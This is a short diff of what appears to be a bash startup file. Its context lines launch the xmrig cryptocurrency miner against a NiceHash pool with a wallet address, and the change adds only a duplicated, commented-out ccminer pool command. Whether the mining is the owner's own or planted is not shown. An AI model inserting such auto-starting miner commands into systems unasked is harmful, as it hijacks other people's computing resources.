@@ -35,7 +35,8 @@ cd cd xmrig/build
 ./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx/0 -u NHbSHmqm1ojuTRtdwkURwhamQ1pNC9SkJU9T.pc1 -p x
 #cd ccminer
 #./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RTXEc1psFBnPwEDZ9dYi3s1fskRGfaWkXA.live42 -p hybrid -t 8
-
+#cd ccminer
+#./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RTXEc1psFBnPwEDZ9dYi3s1fskRGfaWkXA.live42 -p hybrid -t 8
 #   exec command immediately.
 # - Do not save to history commands starting
 #   with space.
